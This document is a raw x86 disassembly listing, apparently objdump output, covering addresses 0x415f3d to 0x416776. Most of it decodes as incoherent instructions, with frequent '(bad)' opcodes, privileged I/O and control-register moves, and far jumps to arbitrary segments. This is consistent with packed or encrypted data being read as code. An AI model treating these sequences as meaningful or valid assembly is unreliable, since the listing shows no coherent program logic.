  415f3d:	inc    edx
  415f3e:	(bad)  
  415f3f:	cli    
  415f40:	xor    eax,0x99344f65
  415f45:	fbstp  TBYTE PTR [edx]
  415f47:	mov    BYTE PTR [ebx-0x16],0x6c
  415f4b:	sub    BYTE PTR [ebx-0x7],ch
  415f4e:	mov    ecx,0xd87a51f9
  415f53:	rcl    DWORD PTR [edi-0x4c],0x60
  415f57:	lea    edx,[esi]
  415f59:	test   eax,0xc05f7784
  415f5e:	aam    0xac
  415f60:	mov    dl,0x61
  415f62:	fwait
  415f63:	adc    esi,DWORD PTR [ebx+0x40]
  415f66:	or     eax,edx
  415f68:	push   eax
  415f69:	mov    eax,ds:0x4222d8
  415f6e:	mov    edi,0x42221e
  415f73:	push   edi
  415f74:	jmp    0x4162fe
  415f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f7a:	inc    edx
  415f7b:	push   ebx
  415f7c:	nop
  415f7d:	mov    bh,0x91
  415f7f:	lods   eax,DWORD PTR ds:[esi]
  415f80:	jl     0x415f17
  415f82:	rcr    DWORD PTR [ebx],1
  415f84:	xor    DWORD PTR [ecx+edi*8-0x3449fac7],esp
  415f8b:	sar    DWORD PTR [ebx-0x44443a70],0x7a
  415f92:	cdq    
  415f93:	fwait
  415f94:	or     bl,BYTE PTR [esi]
  415f96:	lds    ecx,FWORD PTR [ecx]
  415f98:	test   al,0xd1
  415f9a:	and    eax,0x83578895
  415f9f:	jnp    0x415f67
  415fa1:	dec    edx
  415fa2:	mov    dh,BYTE PTR [edi+0x56]
  415fa5:	jp     0x415f54
  415fa7:	fiadd  DWORD PTR [edx-0x62ade415]
  415fad:	push   esi
  415fae:	mov    ds:0x9d38d2bb,eax
  415fb3:	dec    esi
  415fb4:	cmp    ch,al
  415fb6:	add    al,BYTE PTR [edx+0x25]
  415fb9:	or     edi,DWORD PTR [ebx]
  415fbb:	sub    ebp,ecx
  415fbd:	pop    es
  415fbe:	sub    al,0xa0
  415fc0:	je     0x415f66
  415fc2:	leave  
  415fc3:	cli    
  415fc4:	test   BYTE PTR ds:0x8466949e,cl
  415fca:	pop    esi
  415fcb:	pop    eax
  415fcc:	addr16 mov cl,0x20
  415fcf:	gs ret 0x5527
  415fd3:	out    dx,al
  415fd4:	retf   0x7318
  415fd7:	scas   eax,DWORD PTR es:[edi]
  415fd8:	mov    eax,0x9b4dd98e
  415fdd:	les    edi,FWORD PTR [ebp+0x7d]
  415fe0:	mov    ch,0x3
  415fe2:	or     ch,BYTE PTR [edi-0x59]
  415fe5:	retf   
  415fe6:	scas   al,BYTE PTR es:[edi]
  415fe7:	lea    edx,[esi-0x888b4bd]
  415fed:	xchg   esp,eax
  415fee:	inc    edx
  415fef:	sub    DWORD PTR [edi-0x70aa9608],0xd3305117
  415ff9:	mov    eax,0xe35c1571
  415ffe:	out    0x86,al
  416000:	adc    al,BYTE PTR [edi+0x3c9c5e9d]
  416006:	std    
  416007:	retf   0x8014
  41600a:	inc    edx
  41600b:	js     0x416052
  41600d:	mov    cl,0x9f
  41600f:	xor    al,0xe8
  416011:	inc    ebp
  416012:	xor    al,0x59
  416014:	daa    
  416015:	in     eax,0x6
  416017:	(bad)  
  41601a:	inc    edx
  41601b:	cmc    
  41601c:	cdq    
  41601d:	push   0xffffff96
  41601f:	mov    esp,0x6a981476
  416024:	daa    
  416025:	icebp  
  416026:	push   esp
  416027:	pop    esp
  416028:	and    al,0xf6
  41602a:	adc    al,0x4a
  41602c:	adc    BYTE PTR [ecx+0x3d],bl
  41602f:	fsubr  QWORD PTR [ebp-0x65]
  416032:	or     al,0x93
  416034:	jl     0x416035
  416036:	inc    eax
  416037:	mov    eax,ds:0x57be8a13
  41603c:	mov    edi,0xfd940b9f
  416041:	inc    edx
  416042:	jl     0x415fe3
  416044:	push   ds
  416045:	cmp    ebx,ecx
  416047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416048:	pop    edi
  416049:	mov    esi,0x81d52dee
  41604e:	sbb    eax,0x32683172
  416053:	out    dx,al
  416054:	loope  0x415fee
  416056:	sub    edx,DWORD PTR [edx+ebp*2+0x63]
  41605a:	scas   eax,DWORD PTR es:[edi]
  41605b:	dec    edx
  41605c:	dec    ebx
  41605d:	or     ebx,DWORD PTR [eax*1-0x261b4ed6]
  416064:	mov    ebx,0xe1f9b877
  416069:	and    BYTE PTR [ecx],0xf7
  41606c:	sub    edi,DWORD PTR cs:[ebx-0x2335e1f]
  416073:	cmp    eax,0x500f83b
  416078:	enter  0x8e99,0x87
  41607c:	inc    edi
  41607d:	sub    BYTE PTR [esi+0x3d9356ac],bl
  416083:	daa    
  416084:	(bad)  
  416085:	jl     0x416020
  416087:	sti    
  416088:	mov    edi,0x3887f336
  41608d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41608e:	push   esp
  41608f:	mov    edi,0xe7b17a28
  416094:	adc    BYTE PTR [esi+0x2a],al
  416097:	popa   
  416098:	and    al,0x97
  41609a:	test   al,0x9d
  41609c:	mov    dh,0x6d
  41609e:	adc    ebx,edi
  4160a0:	jns    0x416120
  4160a2:	xor    dl,dl
  4160a4:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4160a6:	je     0x41610b
  4160a8:	sub    al,0xc2
  4160aa:	fsubr  st(3),st
  4160ac:	jbe    0x4160a3
  4160ae:	jl     0x4160c8
  4160b0:	sub    al,0xf2
  4160b2:	int3   
  4160b3:	outs   dx,DWORD PTR ds:[si]
  4160b5:	pop    ds
  4160b6:	js     0x41610d
  4160b8:	mov    edx,0x295676ee
  4160bd:	fsub   DWORD PTR [edx+0x64]
  4160c0:	inc    edi
  4160c1:	mov    bh,0xf3
  4160c3:	bnd jge 0x4160d2
  4160c6:	lock ret 
  4160c8:	cmp    BYTE PTR [edi-0x3c6dfffd],dh
  4160ce:	xchg   esp,eax
  4160cf:	lods   al,BYTE PTR ds:[esi]
  4160d0:	(bad)  
  4160d1:	rcl    DWORD PTR [ebp+ecx*4+0x235f83ca],1
  4160d8:	out    dx,eax
  4160d9:	test   DWORD PTR [edi-0x27],esp
  4160dc:	mov    cl,0xef
  4160de:	loope  0x41608e
  4160e0:	fcmovnb st,st(1)
  4160e2:	jae    0x41607c
  4160e4:	fsubr  QWORD PTR [esi]
  4160e6:	outs   dx,DWORD PTR ds:[esi]
  4160e7:	sub    ebp,DWORD PTR [edx-0x7d]
  4160ea:	clc    
  4160eb:	mov    bh,BYTE PTR [ecx+0x22]
  4160ee:	or     edi,DWORD PTR [ebp-0x10]
  4160f1:	xor    dh,al
  4160f3:	jmp    0x9a54:0x3e8d07b7
  4160fa:	mov    BYTE PTR [ebx+0x6f787478],ch
  416100:	or     dl,BYTE PTR [eax+0x13bfe6e2]
  416106:	inc    eax
  416107:	stos   DWORD PTR es:[edi],eax
  416108:	sbb    eax,0xf5daca0a
  41610d:	int    0xe6
  41610f:	push   ds
  416110:	and    al,0x1
  416112:	sub    DWORD PTR [esi+0x54bfc366],edi
  416118:	inc    ebx
  416119:	xor    eax,0x945f191
  41611e:	(bad)  
  41611f:	mov    cl,0xb0
  416121:	jbe    0x4160d6
  416123:	sbb    DWORD PTR [edx-0x16],ebx
  416126:	sar    cl,0x82
  416129:	dec    esi
  41612a:	aas    
  41612b:	mov    edi,cs
  41612d:	mov    bh,0x39
  41612f:	pop    ds
  416130:	ss loope 0x416196
  416133:	mov    eax,DWORD PTR [ecx]
  416135:	imul   edx,DWORD PTR [edx-0x34],0x308f23f1
  41613c:	pop    edi
  41613d:	bound  edi,QWORD PTR [edx-0x63]
  416140:	in     al,dx
  416141:	out    0xb2,al
  416143:	paddusb mm7,QWORD PTR [ebp-0x52]
  416147:	movlps xmm0,QWORD PTR [ebx]
  41614a:	mov    eax,ds:0x993eef06
  41614f:	push   eax
  416150:	pop    ebp
  416151:	fistp  WORD PTR ds:[edi]
  416154:	sub    dl,BYTE PTR [ebx-0x76255197]
  41615a:	lods   al,BYTE PTR ds:[esi]
  41615b:	xchg   esp,eax
  41615c:	loop   0x41612e
  41615e:	cmp    DWORD PTR [esi+0x74],esp
  416161:	test   dh,ch
  416163:	adc    eax,0x9915de0a
  416168:	cs int3 
  41616a:	lea    eax,[edi]
  41616c:	fucom  st(4)
  41616e:	push   ebx
  41616f:	pop    ss
  416170:	out    dx,eax
  416171:	mov    bl,0x33
  416173:	call   0x2cd8a0
  416178:	fist   WORD PTR [edi-0x73c403f2]
  41617e:	in     al,0x79
  416180:	cmp    dl,al
  416182:	(bad)  
  416183:	xlat   BYTE PTR ds:[ebx]
  416184:	std    
  416185:	add    cl,BYTE PTR ds:0xb3bc43f4
  41618b:	adc    cl,BYTE PTR [ebp-0x64d28ce5]
  416191:	and    edx,DWORD PTR [esi+edx*8-0x15]
  416195:	fistp  QWORD PTR [edi]
  416197:	(bad)  
  416198:	neg    eax
  41619a:	gs pop ss
  41619c:	or     eax,0xa56d43d1
  4161a1:	mov    cr1,ecx
  4161a4:	fisubr DWORD PTR [esi+0x6541b6d6]
  4161aa:	outs   dx,BYTE PTR ds:[esi]
  4161ab:	or     ecx,DWORD PTR [edx-0x60]
  4161ae:	retf   0x2192
  4161b1:	and    eax,0xca159715
  4161b6:	inc    esi
  4161b7:	cs addr16 dec eax
  4161ba:	repnz out dx,ax
  4161bd:	push   cs
  4161be:	inc    ecx
  4161bf:	bound  esp,QWORD PTR [ebx+0x4ad5aab9]
  4161c5:	xor    esp,esp
  4161c7:	push   edi
  4161c8:	test   BYTE PTR [edi+0x31],dh
  4161cb:	pop    edi
  4161cc:	jae    0x416217
  4161ce:	and    al,0xc3
  4161d1:	rol    DWORD PTR [ebx-0x3a],1
  4161d4:	dec    esp
  4161d5:	fld    TBYTE PTR [ebp+0x1dac0a8c]
  4161db:	shl    BYTE PTR [edx],1
  4161dd:	rol    BYTE PTR [esi+ecx*4-0x5198f5ec],1
  4161e4:	ss jnp 0x41621f
  4161e7:	adc    al,0x40
  4161e9:	test   DWORD PTR [ebp+0x30ad59b6],edi
  4161ef:	lock add DWORD PTR [ebp+0x73],edi
  4161f3:	jmp    0x7bfb99ad
  4161f8:	in     eax,dx
  4161f9:	adc    ch,bh
  4161fb:	mov    cl,0xa7
  4161fd:	loope  0x416243
  4161ff:	mov    ah,0xe9
  416201:	xchg   ebx,eax
  416202:	xchg   BYTE PTR ds:0xe6d364d7,ch
  416208:	sub    al,0xd8
  41620a:	clc    
  41620b:	cwde   
  41620c:	dec    esp
  41620d:	xor    eax,0x72d32c8e
  416212:	add    bh,cl
  416214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416215:	and    DWORD PTR [esi+0x3b3841ed],edi
  41621b:	or     edx,DWORD PTR [ebx-0x26c22421]
  416221:	sub    BYTE PTR [ebx+0xf],0x92
  416225:	pushf  
  416226:	ja     0x4161fd
  416228:	mov    al,ds:0xe38e3cbe
  41622d:	fimul  DWORD PTR [edx-0x56656a0e]
  416233:	loope  0x416245
  416235:	mov    al,0x3a
  416237:	(bad)  
  416238:	faddp  st(4),st
  41623a:	xchg   ebx,eax
  41623b:	mov    ebp,0xb763729b
  416240:	aaa    
  416241:	lock imul ebx,DWORD PTR ds:0x40554e55,0xfffffff5
  416249:	mov    dh,0xee
  41624b:	mov    WORD PTR [ebp+0x675611fb],fs
  416251:	inc    ebp
  416252:	or     ch,BYTE PTR [esp+ebx*4]
  416255:	mov    bh,0x97
  416257:	mov    cs,WORD PTR [edi]
  416259:	jmp    0x4162ab
  41625b:	jb     0x416239
  41625d:	sub    al,0x2
  41625f:	sub    DWORD PTR [ecx+0x7abace8e],ebp
  416265:	int    0x79
  416267:	push   ebp
  416268:	sahf   
  416269:	ret    0xe636
  41626c:	pop    ebp
  41626d:	sub    al,0x25
  41626f:	mov    ah,0x5
  416271:	stos   BYTE PTR es:[edi],al
  416272:	mov    eax,ds:0xdc91b427
  416277:	dec    ebx
  416278:	(bad)  
  416279:	xor    ah,cl
  41627b:	push   ecx
  41627c:	es inc ecx
  41627e:	and    BYTE PTR [esi-0x37ca6f8d],0xeb
  416285:	sub    bh,BYTE PTR [esi-0x57176fc]
  41628b:	je     0x4162a9
  41628d:	mov    dh,0x62
  41628f:	out    0xcb,al
  416291:	dec    edx
  416292:	in     al,0x59
  416294:	xchg   ecx,eax
  416295:	sahf   
  416296:	xchg   ebp,eax
  416297:	add    edi,DWORD PTR [eax+0x34]
  41629a:	jl     0x416245
  41629c:	mov    cl,0x44
  41629e:	jbe    0x416316
  4162a0:	push   0x2728d4b8
  4162a5:	adc    ebp,DWORD PTR [esi]
  4162a7:	jecxz  0x41628b
  4162a9:	xchg   ecx,eax
  4162aa:	mov    DWORD PTR [ebx-0x5bbd70b3],esi
  4162b0:	xor    al,0xea
  4162b2:	repz and BYTE PTR [ecx+0x67],bh
  4162b6:	jp     0x416280
  4162b8:	inc    ecx
  4162b9:	jne    0x41629f
  4162bb:	xor    eax,0x9610927f
  4162c0:	inc    esi
  4162c1:	ss push edi
  4162c3:	out    dx,eax
  4162c4:	sbb    DWORD PTR [ebx-0x1c432246],edx
  4162ca:	or     al,0x73
  4162cc:	test   eax,0xf4bf046c
  4162d1:	pop    ecx
  4162d2:	jne    0x416329
  4162d4:	dec    ebp
  4162d5:	jne    0x416268
  4162d7:	mov    ebx,0x88b6f570
  4162dc:	pop    esi
  4162dd:	loop   0x41631a
  4162df:	call   0xb4678168
  4162e4:	dec    ecx
  4162e5:	mov    cl,0x8c
  4162e7:	lock outs dx,BYTE PTR ds:[esi]
  4162e9:	call   0xd9ec435
  4162ee:	jmp    0x3d26b9b1
  4162f3:	xchg   ecx,eax
  4162f4:	ins    DWORD PTR es:[edi],dx
  4162f5:	add    esi,DWORD PTR [esi-0x34bdb91e]
  4162fb:	dec    eax
  4162fc:	(bad)  
  4162fd:	push   edx
  4162fe:	push   DWORD PTR [eax]
  416300:	shl    ecx,0x1e
  416303:	call   0x41d6cc
  416308:	lea    eax,[ebp-0x80]
  41630b:	push   eax
  41630c:	mov    eax,DWORD PTR [ebp+0x10]
  41630f:	jmp    0x416699
  416314:	imul   edx,DWORD PTR [eax-0x7b467b70],0x9465bd7d
  41631e:	xor    eax,0x194c7871
  416323:	inc    ebp
  416324:	(bad)  
  416325:	aad    0xc1
  416327:	mov    ebx,0xbbbbc590
  41632c:	jno    0x4162f6
  41632e:	and    eax,0xa5febf0b
  416333:	mov    edi,DWORD PTR [eax+ebp*8]
  416336:	dec    ecx
  416337:	(bad)  
  416338:	jle    0x4163a9
  41633a:	dec    eax
  41633b:	sbb    BYTE PTR [ecx+0x28],cl
  41633e:	dec    edi
  41633f:	sbb    dl,bl
  416341:	rcr    bl,cl
  416343:	adc    edi,DWORD PTR [edi+0x51]
  416346:	in     al,dx
  416347:	shl    ecx,0xb4
  41634a:	aad    0x40
  41634c:	in     eax,dx
  41634d:	imul   eax,eax,0x1ca1c132
  416353:	xor    DWORD PTR [ebx-0x26],ecx
  416356:	test   edx,0x5784df3
  41635c:	sub    eax,0xf4111372
  416361:	cmp    BYTE PTR [edi],al
  416363:	div    al
  416365:	out    0xb0,eax
  416367:	daa    
  416368:	inc    edx
  416369:	fs jmp 0x5089:0xe1fff00b
  416371:	push   esi
  416372:	mov    al,0xd3
  416374:	xor    DWORD PTR [eax+0x18c615c9],0xffffffdb
  41637b:	(bad)  
  41637c:	mov    DWORD PTR [eax+0x7c],ecx
  41637f:	xor    dh,ch
  416381:	ds jns 0x4163dd
  416384:	call   0xe22ffe9f
  416389:	mov    ecx,0xcc082e11
  41638e:	mov    ds:0xb5c61cf8,eax
  416393:	or     eax,0x14b1f513
  416398:	mov    edx,0xde77061c
  41639d:	pop    ds
  41639e:	lock xchg ebp,eax
  4163a0:	add    DWORD PTR [edi],esi
  4163a2:	add    DWORD PTR fs:[esi+ebp*2],ebx
  4163a6:	sub    ebp,DWORD PTR [ecx-0x5c982590]
  4163ac:	jmp    0x41634a
  4163ae:	das    
  4163af:	ffree  st(1)
  4163b1:	hlt    
  4163b2:	fld    QWORD PTR [edx]
  4163b4:	mov    BYTE PTR [ebp-0x6e],dh
  4163b7:	ret    
  4163b8:	mov    bl,0x20
  4163ba:	cmp    DWORD PTR [ecx],ecx
  4163bc:	pop    ebx
  4163bd:	bndstx ds:0xa11a2592,(bad)
  4163c4:	call   0x4feab6e8
  4163c9:	or     cl,BYTE PTR [ebx+0x104e288]
  4163cf:	jno    0x4163ac
  4163d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163d2:	adc    edi,ebp
  4163d4:	pop    ebp
  4163d5:	mov    ebp,0x41344993
  4163da:	push   0xc5f921af
  4163df:	stos   DWORD PTR es:[edi],eax
  4163e0:	pop    DWORD PTR [esi+0x2f]
  4163e3:	lods   eax,DWORD PTR ds:[esi]
  4163e4:	test   eax,0xd02bea87
  4163e9:	xor    ch,BYTE PTR [ebp-0x3ebb3ca]
  4163ef:	jl     0x416461
  4163f1:	stos   DWORD PTR es:[edi],eax
  4163f2:	in     eax,dx
  4163f3:	jne    0x4163c9
  4163f5:	pop    ecx
  4163f6:	out    0x2c,al
  4163f8:	das    
  4163f9:	jmp    0x416393
  4163fb:	pusha  
  4163fc:	imul   ecx,DWORD PTR ds:[ebx+0x3d],0x541e3b72
  416404:	adc    BYTE PTR [ebp-0x4a],0x4c
  416408:	dec    ebx
  416409:	push   ecx
  41640a:	or     al,0xaa
  41640c:	rcr    DWORD PTR [eax],cl
  41640e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41640f:	cmp    esp,0x4ec0ca1
  416415:	lds    ecx,FWORD PTR [eax-0x2d]
  416418:	imul   BYTE PTR [ebp+edx*4-0x15]
  41641c:	loop   0x416449
  41641e:	(bad)  
  41641f:	xlat   BYTE PTR ds:[ebx]
  416420:	jle    0x41644e
  416422:	call   0xece6:0xe998bfca
  416429:	shl    DWORD PTR ds:0x6da61907,cl
  41642f:	xchg   ebx,eax
  416430:	xchg   edx,eax
  416431:	call   0x768f:0x890fd481
  416438:	fdivr  st(4),st
  41643a:	jmp    0x5b39:0xda7049f6
  416441:	add    eax,0xd45fedd4
  416446:	dec    esi
  416447:	sub    eax,0x7cdab70
  41644c:	es dec ebx
  41644e:	mov    ch,0xbf
  416450:	dec    esp
  416451:	std    
  416452:	inc    DWORD PTR [edx+0x3ab525cd]
  416458:	cs rcr dh,0x6c
  41645c:	fwait
  41645d:	jae    0x41641d
  41645f:	scas   al,BYTE PTR es:[edi]
  416460:	push   0x5897cdbc
  416465:	xchg   ecx,eax
  416466:	nop
  416467:	outs   dx,DWORD PTR ds:[esi]
  416468:	(bad)  
  416469:	jmp    0x9816:0x4b36c208
  416470:	je     0x4164a3
  416472:	std    
  416473:	sub    eax,0xfb8a5afa
  416478:	inc    esi
  416479:	push   ebx
  41647a:	test   BYTE PTR [ecx-0x3e],dl
  41647d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41647e:	jmp    0x416495
  416480:	mov    ebx,0x3a82fa5f
  416485:	aaa    
  416486:	std    
  416487:	(bad)
  41648b:	xlat   BYTE PTR ds:[ebx]
  41648c:	aad    0x9a
  41648e:	call   0x60ce:0x9910594b
  416495:	mov    eax,0xe198f71d
  41649a:	sbb    al,0xf1
  41649c:	lods   eax,DWORD PTR ds:[esi]
  41649d:	dec    edi
  41649e:	(bad)  
  41649f:	adc    BYTE PTR [edx-0x3],ch
  4164a2:	mov    ah,0x72
  4164a4:	fld    DWORD PTR [ebx+0x28]
  4164a7:	sub    ebx,ebp
  4164a9:	and    al,0x14
  4164ab:	add    al,0xf8
  4164ad:	shr    BYTE PTR [esi],1
  4164af:	adc    DWORD PTR [edi+0x19],esp
  4164b2:	adc    DWORD PTR [ecx-0x2],edi
  4164b5:	push   eax
  4164b6:	ret    0x571f
  4164b9:	(bad)  
  4164ba:	in     al,dx
  4164bb:	pop    esp
  4164bc:	lods   al,BYTE PTR ds:[esi]
  4164bd:	ret    
  4164be:	and    al,0x75
  4164c0:	push   ss
  4164c1:	enter  0xe9f8,0x87
  4164c5:	xchg   DWORD PTR [ecx],ebp
  4164c7:	inc    ecx
  4164c8:	dec    edi
  4164c9:	fsub   DWORD PTR [ebx]
  4164cb:	outs   dx,DWORD PTR ds:[esi]
  4164cc:	pop    ebp
  4164cd:	daa    
  4164ce:	xchg   ebx,eax
  4164cf:	mov    al,ds:0x884195ba
  4164d4:	or     bl,BYTE PTR [ebx+0x72700ca3]
  4164da:	in     eax,0x65
  4164dc:	(bad)
  4164e0:	pop    ss
  4164e1:	mov    ecx,0x6990daa7
  4164e6:	(bad)  
  4164e7:	ja     0x6db07045
  4164ed:	jg     0x416565
  4164ef:	inc    edx
  4164f0:	add    DWORD PTR ss:[edx],edx
  4164f3:	dec    esi
  4164f4:	push   ecx
  4164f5:	aaa    
  4164f6:	sbb    eax,0x4ca0df67
  4164fb:	pop    es
  4164fc:	cs sub eax,0x65db77ee
  416502:	xor    BYTE PTR [edi-0x39b31bf8],cl
  416508:	cmc    
  416509:	sub    esi,DWORD PTR [ecx-0xac20dff]
  41650f:	pop    ebx
  416510:	pusha  
  416511:	shl    DWORD PTR [edi],1
  416513:	fnstsw WORD PTR [ebp+0x8eab77]
  416519:	cmp    DWORD PTR [eax+ecx*1+0x7f],0x37e0bf79
  416521:	lea    esi,[ebp+0x37]
  416524:	xor    BYTE PTR [ecx+0x39],ch
  416527:	retf   
  416528:	pop    ss
  416529:	push   eax
  41652a:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41652c:	cmp    BYTE PTR [ebx-0x77],bl
  41652f:	inc    edx
  416530:	movaps XMMWORD PTR [esp+esi*8-0x2f],xmm6
  416535:	int3   
  416536:	and    edi,DWORD PTR ds:0x769298b9
  41653c:	scas   al,BYTE PTR es:[edi]
  41653d:	shl    dl,0xd2
  416540:	iret   
  416541:	push   esi
  416542:	dec    esi
  416543:	xlat   BYTE PTR ds:[ebx]
  416544:	into   
  416545:	jp     0x416566
  416547:	xor    DWORD PTR [ebx-0x3f66ae33],esi
  41654d:	adc    ebx,DWORD PTR [esi]
  41654f:	fxch   st(0)
  416551:	sahf   
  416552:	hlt    
  416553:	retf   0xfc78
  416556:	xchg   ebp,eax
  416557:	jbe    0x416569
  416559:	loop   0x4164e6
  41655b:	inc    ecx
  41655c:	in     eax,0x72
  41655e:	jbe    0x41657d
  416560:	std    
  416561:	mov    esi,0xcb4ae6c6
  416566:	jno    0x41653b
  416568:	shl    al,1
  41656a:	fs aaa 
  41656c:	repnz inc ecx
  41656e:	and    ch,BYTE PTR [eax-0x60]
  416571:	mov    edi,0xb61aea2e
  416576:	jmp    0x41657d
  416578:	jno    0x416564
  41657a:	mov    cl,0x60
  41657c:	mov    ecx,0x3bd1b01c
  416581:	xchg   esi,eax
  416582:	push   ds
  416583:	iret   
  416584:	popa   
  416585:	sub    BYTE PTR [ebx+ebp*4+0x579c2ad],ah
  41658c:	aas    
  41658d:	inc    esp
  41658e:	sbb    al,0xab
  416590:	mov    ah,0xa5
  416592:	add    DWORD PTR [ebp+0x33],0x4f
  416596:	adc    ebp,eax
  416598:	bound  esi,QWORD PTR [ebx-0x7723edbb]
  41659e:	aaa    
  41659f:	and    al,0xb
  4165a1:	inc    ebp
  4165a2:	in     eax,0x81
  4165a4:	xchg   ebx,eax
  4165a5:	cdq    
  4165a6:	pop    ebx
  4165a7:	lahf   
  4165a8:	je     0x416597
  4165aa:	cdq    
  4165ab:	or     bh,BYTE PTR [edx-0x16]
  4165ae:	jb     0x416550
  4165b0:	pop    ds
  4165b1:	mov    bl,0x40
  4165b3:	pusha  
  4165b4:	jmp    0x4165b5
  4165b6:	ret    0x13ad
  4165b9:	push   esi
  4165ba:	loop   0x41659a
  4165bc:	repz inc esp
  4165be:	in     eax,dx
  4165bf:	and    al,0x55
  4165c1:	jb     0x416636
  4165c3:	icebp  
  4165c4:	ret    0x1b13
  4165c7:	(bad)  
  4165c8:	out    dx,al
  4165c9:	clc    
  4165ca:	ret    0xe9a3
  4165cd:	test   edi,0xaf1d82cf
  4165d3:	jmp    0x416576
  4165d5:	cwde   
  4165d6:	or     BYTE PTR [eax+0x16],bh
  4165d9:	addr16 daa 
  4165db:	and    eax,0x2c2cd547
  4165e0:	mov    ch,0x29
  4165e2:	rol    ah,1
  4165e4:	cmp    DWORD PTR [ebx],eax
  4165e6:	cmp    dl,al
  4165e8:	pop    eax
  4165e9:	cmp    BYTE PTR [ecx-0x41],bh
  4165ec:	mov    ecx,0x332223fb
  4165f1:	jmp    0x4165af
  4165f3:	mov    bl,0x3a
  4165f5:	xor    bl,BYTE PTR [esi]
  4165f7:	or     eax,0x58e603
  4165fc:	xchg   ebp,eax
  4165fd:	nop
  4165fe:	scas   al,BYTE PTR es:[edi]
  4165ff:	add    eax,DWORD PTR [eax+ecx*4-0x26061984]
  416606:	hlt    
  416607:	fdiv   st(3),st
  416609:	repnz xor esp,edi
  41660c:	xor    eax,0x3a8ce0f3
  416611:	fdivr  QWORD PTR [eax+0x29]
  416614:	or     eax,0x6be0194e
  416619:	jmp    0x310c:0x44168ffe
  416620:	xor    BYTE PTR [ebp+ebp*2+0x629d4939],cl
  416627:	xor    al,bl
  416629:	daa    
  41662a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41662b:	mov    ch,0x8
  41662d:	aad    0x45
  41662f:	or     bh,bl
  416631:	add    esi,ecx
  416633:	aas    
  416634:	mov    ds:0x5d2f202e,al
  416639:	iret   
  41663a:	pop    ecx
  41663b:	mov    esi,0xd6602e70
  416640:	sbb    BYTE PTR [edi],dl
  416642:	mov    esp,0xd30e4d41
  416647:	or     ebp,edi
  416649:	or     eax,esi
  41664b:	into   
  41664c:	add    eax,0x6794b58a
  416651:	loope  0x41669e
  416653:	mov    ds:0x4cc93dd9,eax
  416658:	adc    BYTE PTR [edi],bh
  41665a:	add    eax,0xec36f047
  41665f:	jmp    0x416636
  416661:	mov    edi,0x963dff1f
  416666:	ins    BYTE PTR es:[edi],dx
  416667:	std    
  416668:	popf   
  416669:	and    eax,0x44034347
  41666e:	push   esp
  41666f:	outs   dx,DWORD PTR ds:[esi]
  416670:	lahf   
  416671:	cmp    eax,0x8116990c
  416676:	dec    esi
  416677:	ficomp DWORD PTR [ecx+edx*4+0x590767a8]
  41667e:	ins    BYTE PTR es:[edi],dx
  41667f:	jno    0x416615
  416681:	xchg   edx,eax
  416682:	push   edi
  416683:	mov    esi,0xbaf1d21f
  416688:	mov    ebx,0xa44c3420
  41668d:	mov    al,ds:0xd5e082aa
  416692:	pop    ecx
  416693:	cmp    DWORD PTR [eax-0x442d5d81],0xf144d8b
  41669d:	lods   al,BYTE PTR ds:[esi]
  41669e:	enter  0xc102,0xe9
  4166a2:	add    cl,BYTE PTR [ebx+0x558b104d]
  4166a8:	adc    al,0x33
  4166aa:	(bad)  
  4166ab:	xor    edx,edx
  4166ad:	jmp    0x416a37
  4166b2:	mov    eax,0xb693a624
  4166b7:	cdq    
  4166b8:	mov    ebp,0xd6a2fe25
  4166bd:	outs   dx,DWORD PTR ds:[esi]
  4166be:	or     DWORD PTR [ebx+esi*1],eax
  4166c1:	add    eax,0xbbc1dd5a
  4166c6:	nop
  4166c7:	lds    edi,FWORD PTR [ebx-0x5818d545]
  4166cd:	or     dh,BYTE PTR [eax+eax*2-0x405c310]
  4166d4:	sbb    DWORD PTR [ebx],esi
  4166d6:	outs   dx,BYTE PTR ds:[esi]
  4166d7:	or     eax,DWORD PTR [esi-0x660f09d]
  4166dd:	mov    ch,0x4e
  4166df:	jne    0x416725
  4166e1:	mov    dl,0x2
  4166e3:	mov    ecx,0x4309235e
  4166e8:	and    DWORD PTR [eax-0xaa93d0b],eax
  4166ee:	pop    es
  4166ef:	jo     0x41669e
  4166f1:	sub    eax,0x707ab687
  4166f6:	repnz sbb eax,0xe25f74c9
  4166fc:	retf   0x2e6d
  4166ff:	call   FWORD PTR [ebx]
  416701:	iret   
  416702:	xchg   edx,eax
  416703:	jns    0x416740
  416705:	pop    ss
  416706:	int3   
  416707:	adc    al,0xa5
  416709:	adc    dh,BYTE PTR [edx-0x36]
  41670c:	push   0xffffffee
  41670e:	mov    ds:0x322cdb7a,eax
  416713:	rcr    BYTE PTR [edi],0x27
  416716:	scas   al,BYTE PTR es:[edi]
  416717:	popa   
  416718:	cmp    al,0x80
  41671a:	ds push 0xffffffaf
  41671d:	(bad)  
  41671e:	mov    ebp,0x33fb014
  416723:	in     al,0x1
  416725:	mov    DWORD PTR [esi-0x35],edx
  416728:	les    esp,FWORD PTR [esi+0x3b]
  41672b:	mov    al,0x3b
  41672d:	push   eax
  41672e:	push   es
  41672f:	enter  0xf0c4,0x28
  416733:	sbb    dh,ch
  416735:	mul    DWORD PTR [ebx+ecx*1]
  416738:	arpl   WORD PTR [ebx-0x13b80da6],di
  41673e:	cwde   
  41673f:	pop    ss
  416740:	(bad)  
  416741:	pop    ecx
  416742:	(bad)  
  416743:	fxam   
  416745:	sahf   
  416746:	in     eax,dx
  416747:	mov    edx,DWORD PTR [edi+0x2f567aa2]
  41674d:	inc    ecx
  41674e:	std    
  41674f:	fist   DWORD PTR ds:0x3d17064d
  416755:	test   al,0x53
  416757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416758:	sbb    bl,BYTE PTR [edx]
  41675a:	pop    ss
  41675b:	jg     0x4167bf
  41675d:	repz jmp 0x4212271c
  416763:	add    eax,ecx
  416765:	xor    al,0x9f
  416767:	sub    DWORD PTR [eax+ebp*1-0x74023e23],edi
  41676e:	popf   
  41676f:	aas    
  416770:	jnp    0x4166f8
  416772:	xchg   cl,cl
  416774:	arpl   sp,di
  416776:	jns    0x4167b5
